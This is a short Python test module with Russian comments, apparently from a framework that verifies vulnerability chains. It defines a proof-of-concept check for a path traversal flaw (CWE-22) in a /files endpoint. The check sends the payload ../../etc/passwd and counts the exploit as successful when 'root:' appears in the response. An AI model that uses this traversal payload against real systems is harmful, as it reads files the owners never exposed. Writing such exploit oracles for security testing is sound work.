"""PoC-оракул: обход пути в эндпоинте /files (CWE-22).

После трёх стадий параметр path передаётся в open() без проверки,
поэтому запрос /files?path=../../etc/passwd читает системный файл.
"""

from mosaic.oracle.exploit import ExploitTest


class PathTraversalExploit(ExploitTest):
    """Чтение файлов вне каталога files/ через параметр path."""

    @property
    def chain_id(self) -> str:
        return "demo_path_traversal"

    def execute(self) -> tuple[bool, str]:
        resp = self.http_get("/files", params={"path": "../../etc/passwd"})
        if resp.ok and "root:" in resp.text:
            return True, (
                "Прочитан /etc/passwd вне каталога files/: параметр path "
                "не проверяется на ../ (CWE-22)."
            )
        return False, "Не удалось прочитать файл вне каталога files/."
